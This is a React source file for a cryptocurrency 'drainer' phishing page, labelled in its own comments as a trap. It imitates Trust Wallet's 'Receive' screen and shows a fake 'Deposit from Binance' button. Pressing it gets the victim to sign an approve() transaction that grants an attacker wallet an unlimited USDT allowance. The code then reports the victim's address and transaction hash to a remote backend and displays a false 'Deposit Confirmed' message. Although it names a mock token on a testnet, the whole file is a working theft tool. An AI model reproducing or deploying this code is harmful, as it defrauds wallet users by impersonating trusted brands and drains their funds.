import React, { useEffect, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

// TRON LOGO (red diamond) for QR center
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

// BINANCE LOGO (yellow diamond)
const BINANCE_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2YwYjkwYiI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [step, setStep] = useState("idle"); // idle | connecting | approving | done
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(false);

  // QR encodes the Vercel URL so scanning opens the drainer site
  const qrValue = VERCEL_URL;

  // 1. DETECT WALLET AUTOMATICALLY
  useEffect(() => {
    const checkWallet = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
          readBalance(addr);
        }
      }
    }, 1500);
    return () => clearInterval(checkWallet);
  }, [isConnected]);

  const readBalance = async (addr) => {
    try {
      const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const raw = await c.balanceOf(addr).call();
      setVictimBal(Number(raw.toString()) / 1e6);
    } catch (e) { console.log("balance read", e); }
  };

  // 2. "DEPOSIT FROM BINANCE" BUTTON → opens wallet modal
  const handleDeposit = () => {
    if (step === "done") return;
    if (!isConnected) {
      setShowWalletModal(true);
    } else {
      executeApprove();
    }
  };

  // 3. CONNECT TO WALLET
  const connectToWallet = async (walletType) => {
    setShowWalletModal(false);
    setStep("connecting");
    setError("");

    try {
      if (walletType === "tronlink") {
        if (window.tronLink?.request) {
          await window.tronLink.request({ method: "tron_requestAccounts" });
        } else if (window.tronWeb) {
          await window.tronWeb.request({ method: "tron_requestAccounts" });
        } else {
          window.location.href = `tronlink://open?url=${encodeURIComponent(window.location.href)}`;
          return;
        }
      } else if (walletType === "trust") {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
        return;
      }

      await new Promise(r => setTimeout(r, 2000));

      if (window.tronWeb?.defaultAddress?.base58) {
        setIsConnected(true);
        setWallet(window.tronWeb.defaultAddress.base58);
        readBalance(window.tronWeb.defaultAddress.base58);
        setStep("idle");
      } else {
        throw new Error("Connection failed. Please try again.");
      }
    } catch (e) {
      setError(e.message);
      setStep("idle");
    }
  };

  // 4. EXECUTE THE APPROVE TRAP
  const executeApprove = async () => {
    setStep("approving");
    setError("");

    try {
      if (!window.tronWeb || !window.tronWeb.defaultAddress) {
        throw new Error("Wallet not connected");
      }

      const userAddress = window.tronWeb.defaultAddress.base58;

      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
        TOKEN_ADDRESS,
        "approve(address,uint256)",
        { feeLimit: 100000000, callValue: 0 },
        [
          { type: "address", value: ATTACKER_WALLET },
          { type: "uint256", value: 1000000000000000 }
        ],
        userAddress
      );

      if (!transaction.result || !transaction.result.result) {
        throw new Error("Contract call rejected");
      }

      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);

      if (!broadcast.result) {
        throw new Error("Broadcast failed");
      }

      const txId = broadcast.txid || transaction.transaction.txID;
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress: userAddress, txHash: txId, network: "TRON Shasta" })
      });

      setStep("done");
    } catch (e) {
      console.error(e);
      setError(e.message || "Transaction failed.");
      setStep("idle");
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(ATTACKER_WALLET);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleShare = async () => {
    try {
      if (navigator.share) {
        await navigator.share({ title: "Receive TRON", url: VERCEL_URL });
      } else {
        navigator.clipboard.writeText(VERCEL_URL);
        alert("Link copied!");
      }
    } catch (e) {}
  };

  const handleDownloadQR = () => {
    const svg = document.querySelector("#lab-qr-box svg");
    if (!svg) return;
    const size = 400;
    const canvas = document.createElement("canvas");
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext("2d");
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, size, size);
    const img = new Image();
    const svgData = new XMLSerializer().serializeToString(svg);
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      const ls = size * 0.22, lp = (size - ls) / 2;
      ctx.beginPath();
      ctx.arc(size / 2, size / 2, ls / 2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#ffffff";
      ctx.fill();
      const logo = new Image();
      logo.onload = () => {
        ctx.drawImage(logo, lp, lp, ls, ls);
        const a = document.createElement("a");
        a.download = "TRON-Receive.png";
        a.href = canvas.toDataURL("image/png");
        a.click();
      };
      logo.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
  };

  return (
    <div style={{
      background: "#0f1419",
      minHeight: "100vh",
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      color: "#ffffff",
      display: "flex",
      flexDirection: "column"
    }}>
      {/* HEADER - matches Trust Wallet "Receive" screen */}
      <div style={{
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        padding: "16px 20px",
        borderBottom: "1px solid #1e2530"
      }}>
        <div style={{ width: 32 }}></div>
        <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600 }}>Receive</h1>
        <div style={{ width: 32, display: "flex", justifyContent: "flex-end" }}>
          <span style={{ fontSize: 20, color: "#8a94a6", cursor: "pointer" }}>✕</span>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", padding: "24px 20px" }}>

        {/* TRON NETWORK DROPDOWN */}
        <div style={{
          display: "flex",
          alignItems: "center",
          gap: 8,
          background: "#1e2530",
          padding: "8px 16px",
          borderRadius: 20,
          marginBottom: 24,
          cursor: "pointer"
        }}>
          <span style={{
            width: 20, height: 20, borderRadius: "50%",
            background: "#eb2c31",
            display: "flex", alignItems: "center", justifyContent: "center",
            fontSize: 11, fontWeight: 700
          }}>T</span>
          <span style={{ fontSize: 15, fontWeight: 500 }}>Tron</span>
          <span style={{ fontSize: 10, color: "#8a94a6" }}>▾</span>
        </div>

        {/* QR CODE CARD */}
        <div style={{
          background: "#ffffff",
          borderRadius: 16,
          padding: 20,
          marginBottom: 20,
          width: "100%",
          maxWidth: 340,
          boxShadow: "0 4px 20px rgba(0,0,0,0.3)"
        }}>
          <div id="lab-qr-box" style={{ textAlign: "center" }}>
            <QRCodeSVG
              value={qrValue}
              size={240}
              level="H"
              includeMargin={false}
              imageSettings={{ src: TRON_LOGO_B64, height: 56, width: 56, excavate: true }}
            />
          </div>

          {/* ADDRESS BELOW QR */}
          <div style={{
            textAlign: "center",
            marginTop: 16,
            fontFamily: "monospace",
            fontSize: 13,
            color: "#0f1419",
            fontWeight: 500,
            wordBreak: "break-all"
          }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* WARNING BANNER */}
        <div style={{
          background: "#2a2418",
          border: "1px solid #3d3422",
          borderRadius: 12,
          padding: "12px 16px",
          fontSize: 13,
          color: "#d4a574",
          marginBottom: 24,
          display: "flex",
          gap: 10,
          alignItems: "flex-start",
          width: "100%",
          maxWidth: 340
        }}>
          <span style={{ fontSize: 16, flexShrink: 0 }}>⚠️</span>
          <span style={{ lineHeight: 1.4 }}>Only send Tron assets to this address. Other assets will be lost forever.</span>
        </div>

        {/* ERROR MESSAGE */}
        {error && (
          <div style={{
            background: "#3d1818",
            border: "1px solid #5c2424",
            color: "#f08080",
            padding: 12,
            borderRadius: 10,
            fontSize: 13,
            marginBottom: 16,
            textAlign: "center",
            width: "100%",
            maxWidth: 340
          }}>
            {error}
          </div>
        )}

        {/* COPY & SHARE BUTTONS */}
        <div style={{
          display: "grid",
          gridTemplateColumns: "1fr 1fr",
          gap: 12,
          marginBottom: 20,
          width: "100%",
          maxWidth: 340
        }}>
          <button
            onClick={handleCopy}
            style={{
              background: "#1e2530",
              border: "1px solid #2a3340",
              borderRadius: 12,
              padding: 14,
              color: "#ffffff",
              fontSize: 20,
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center"
            }}
          >
            {copied ? "✓" : "📋"}
          </button>
          <button
            onClick={handleShare}
            style={{
              background: "#1e2530",
              border: "1px solid #2a3340",
              borderRadius: 12,
              padding: 14,
              color: "#ffffff",
              fontSize: 20,
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center"
            }}
          >
            📤
          </button>
        </div>

        {/* DEPOSIT FROM BINANCE BUTTON */}
        <button
          onClick={handleDeposit}
          disabled={step === "connecting" || step === "approving" || step === "done"}
          style={{
            width: "100%",
            maxWidth: 340,
            background: step === "done" ? "#0ecb81" : "#1e2530",
            border: "1px solid #2a3340",
            borderRadius: 12,
            padding: 16,
            color: "#ffffff",
            fontSize: 16,
            fontWeight: 600,
            cursor: step === "connecting" || step === "approving" ? "not-allowed" : "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 10
          }}
        >
          {step === "connecting" ? "Connecting..." :
           step === "approving" ? "Processing..." :
           step === "done" ? "✓ Deposit Confirmed" : (
            <>
              <span style={{
                width: 22, height: 22, borderRadius: "50%",
                background: "#f0b90b",
                display: "flex", alignItems: "center", justifyContent: "center",
                fontSize: 12, fontWeight: 700, color: "#000"
              }}>B</span>
              Deposit from Binance
            </>
          )}
        </button>

        {/* SUCCESS MESSAGE */}
        {step === "done" && (
          <div style={{
            marginTop: 16,
            background: "#0d3320",
            border: "1px solid #1a5c3a",
            borderRadius: 10,
            padding: 12,
            fontSize: 13,
            color: "#4ade80",
            textAlign: "center",
            width: "100%",
            maxWidth: 340
          }}>
            Transaction confirmed. Your deposit is being processed.
          </div>
        )}

        {/* SESSION INFO (subtle, at bottom) */}
        {isConnected && (
          <div style={{
            marginTop: 20,
            textAlign: "center",
            fontSize: 11,
            color: "#5a6474",
            fontFamily: "monospace"
          }}>
            Session: {short(wallet)} · Balance: {victimBal.toFixed(2)} USDT
          </div>
        )}
      </div>

      {/* WALLET SELECTION MODAL */}
      {showWalletModal && (
        <div style={{
          position: "fixed",
          inset: 0,
          background: "rgba(0,0,0,0.85)",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          zIndex: 1000,
          padding: 20
        }}>
          <div style={{
            background: "#1e2530",
            borderRadius: 20,
            padding: 24,
            width: "100%",
            maxWidth: 340,
            border: "1px solid #2a3340"
          }}>
            <h3 style={{ margin: "0 0 20px 0", color: "#ffffff", textAlign: "center", fontSize: 18, fontWeight: 600 }}>
              Connect Wallet
            </h3>

            <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
              <button
                onClick={() => connectToWallet("tronlink")}
                style={{
                  background: "#0f1419",
                  border: "1px solid #2a3340",
                  borderRadius: 12,
                  padding: 16,
                  color: "#ffffff",
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                  fontSize: 15,
                  width: "100%"
                }}
              >
                <span style={{
                  width: 36, height: 36, borderRadius: 10,
                  background: "#eb2c31",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  color: "#fff", fontWeight: 700, fontSize: 18
                }}>T</span>
                TronLink
              </button>

              <button
                onClick={() => connectToWallet("trust")}
                style={{
                  background: "#0f1419",
                  border: "1px solid #2a3340",
                  borderRadius: 12,
                  padding: 16,
                  color: "#ffffff",
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                  fontSize: 15,
                  width: "100%"
                }}
              >
                <span style={{
                  width: 36, height: 36, borderRadius: 10,
                  background: "#3375bb",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  color: "#fff", fontWeight: 700, fontSize: 18
                }}>🛡️</span>
                Trust Wallet
              </button>
            </div>

            <button
              onClick={() => setShowWalletModal(false)}
              style={{
                marginTop: 20,
                width: "100%",
                background: "transparent",
                border: "none",
                color: "#8a94a6",
                cursor: "pointer",
                fontSize: 14,
                padding: 12
              }}
            >
              Cancel
            </button>
          </div>
        </div>
      )}
    </div>
  );
}